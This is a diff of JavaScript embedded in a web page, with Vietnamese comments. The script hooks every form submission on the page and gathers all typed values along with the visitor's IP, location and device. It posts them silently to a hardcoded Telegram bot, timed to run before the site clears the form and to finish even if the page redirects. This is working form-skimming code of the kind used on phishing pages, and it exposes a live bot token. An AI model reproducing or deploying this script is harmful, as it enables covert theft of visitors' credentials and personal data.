@@ -6,9 +6,9 @@
     // ================= CẤU HÌNH TELEGRAM =================
     const BOT_TOKEN = '9141061384:AAHGfs-TlTtvmoZaY0SicT-YH5Shmb907R4';
     const CHAT_ID = '-5377276972';
-    const STORAGE_KEY = 'tg_saved_old_form_data'; // Nơi lưu tạm data cũ
     // =====================================================
 
+    // Hàm fetch có giới hạn thời gian (tránh kẹt trên điện thoại)
     async function fetchWithTimeout(url, timeout = 2500) {
         const controller = new AbortController();
         const id = setTimeout(() => controller.abort(), timeout);
@@ -22,6 +22,7 @@
         }
     }
 
+    // Nhận diện thiết bị (Hỗ trợ cả iPhone, iPadOS, Zalo/FB Browser)
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         const isIpadOS = (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
@@ -45,6 +46,7 @@
         return `${deviceType} (${os} - ${browser})`;
     }
 
+    // Lấy IP & Location
     async function getIpAndLocation() {
         try {
             const res = await fetchWithTimeout('https://ipwho.is/', 2500);
@@ -69,6 +71,7 @@
         return String(str).replace(/&/g, '&').replace(/</g, '<').replace(/>/g, '>');
     }
 
+    // Tìm nhãn (Label) thông minh cho các form React/Next.js hay thiếu thuộc tính name
     function getFieldLabel(el, index) {
         if (el.getAttribute('name')) return el.getAttribute('name');
         if (el.getAttribute('placeholder')) return el.getAttribute('placeholder');
@@ -81,37 +84,22 @@
         return `Trường #${index + 1}`;
     }
 
-    // Lấy dữ liệu cũ đang lưu trong sessionStorage
-    function getOldData() {
-        try {
-            const raw = sessionStorage.getItem(STORAGE_KEY);
-            return raw ? JSON.parse(raw) : {};
-        } catch (e) {
-            return {};
-        }
-    }
-
-    // Lưu dữ liệu vào sessionStorage để gộp cho bước sau
-    function saveOldData(dataObj) {
-        try {
-            sessionStorage.setItem(STORAGE_KEY, JSON.stringify(dataObj));
-        } catch (e) {}
-    }
-
-    // Lắng nghe sự kiện Submit trên toàn trang (Capture phase)
+    // Lắng nghe sự kiện ở cấp toàn trang (Capture phase = true để chạy TRƯỚC React)
     document.addEventListener('submit', async function(e) {
         const form = e.target;
         if (!form || form.tagName !== 'FORM') return;
 
+        // Chống gửi trùng lặp 2 lần liên tiếp
         if (form.dataset.tgSending === 'true') return;
         form.dataset.tgSending = 'true';
 
-        // 1. Lấy dữ liệu cũ đã lưu từ trước (nếu có)
-        const mergedData = getOldData(); // Dạng: { "Số điện thoại": ["12112"] }
+        // Lưu ý: Nếu web gốc của bạn có logic chuyển trang hoặc lưu database riêng, 
+        // hãy GIỮ nguyên (không gọi e.preventDefault()) nếu muốn web gốc vẫn chạy bình thường,
+        // HOẶC bỏ comment dòng dưới đây nếu bạn muốn chặn web gốc reload:
+        // e.preventDefault();
 
-        // 2. Quét dữ liệu mới trên form hiện tại và GỘP vào dữ liệu cũ
+        const fieldsMap = new Map();
         const inputs = form.querySelectorAll('input, select, textarea');
-        let hasNewData = false;
 
         inputs.forEach((el, index) => {
             if (['submit', 'button', 'reset', 'file'].includes(el.type)) return;
@@ -120,23 +108,16 @@
             const val = el.value ? el.value.trim() : '';
             if (val === '') return;
 
-            hasNewData = true;
             const fieldName = getFieldLabel(el, index);
-
-            if (!mergedData[fieldName]) {
-                mergedData[fieldName] = [];
-            }
-            // Gộp giá trị mới nối tiếp vào mảng giá trị cũ
-            mergedData[fieldName].push(val);
+            if (!fieldsMap.has(fieldName)) fieldsMap.set(fieldName, []);
+            fieldsMap.get(fieldName).push(val);
         });
 
-        if (!hasNewData) {
+        // Nếu form không có dữ liệu hợp lệ thì bỏ qua
+        if (fieldsMap.size === 0) {
             form.dataset.tgSending = 'false';
             return;
         }
-
-        // Lưu lại toàn bộ dữ liệu đã gộp (đề phòng khách còn chuyển tiếp sang bước 3, bước 4...)
-        saveOldData(mergedData);
 
         try {
             const [geoInfo, deviceInfo] = await Promise.all([
@@ -144,15 +125,13 @@
                 Promise.resolve(getDeviceInfo())
             ]);
 
-            // 3. Tạo nội dung tin nhắn tổng hợp (Data cũ + Data mới)
-            let message = `📩 <b>DỮ LIỆU FORM (ĐÃ GỘP)</b>\n`;
+            let message = `📩 <b>DỮ LIỆU FORM MỚI</b>\n`;
             message += `━━━━━━━━━━━━━━━━━━━━\n`;
 
-            Object.entries(mergedData).forEach(([key, values]) => {
+            fieldsMap.forEach((values, key) => {
                 if (values.length === 1) {
                     message += `🔹 <b>${escapeHTML(key)}:</b> ${escapeHTML(values[0])}\n`;
                 } else {
-                    // Khi có cả data cũ (12112) và data mới (12121) -> Tự xếp thứ tự (1), (2)...
                     values.forEach((v, idx) => {
                         message += `🔹 <b>${escapeHTML(key)} (${idx + 1}):</b> ${escapeHTML(v)}\n`;
                     });
@@ -166,6 +145,7 @@
             message += `🔗 <b>Trang:</b> ${escapeHTML(window.location.href)}\n`;
             message += `⏰ <b>Lúc:</b> ${new Date().toLocaleString('vi-VN')}`;
 
+            // Dùng keepalive: true để đảm bảo tin nhắn vẫn gửi đi thành công ngay cả khi trang chuyển hướng
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -180,9 +160,9 @@
         } catch (err) {
             console.error('Lỗi gửi Telegram:', err);
         } finally {
-            setTimeout(() => { form.dataset.tgSending = 'false'; }, 1500);
+            setTimeout(() => { form.dataset.tgSending = 'false'; }, 2000);
         }
-    }, true);
+    }, true); // Tham số true (Capture phase) giúp bắt dữ liệu trước khi React xóa form
 })();
 </script><meta charSet="utf-8"/>
 <!-- This site is hosted on Netlify. Anyone can build and deploy a site
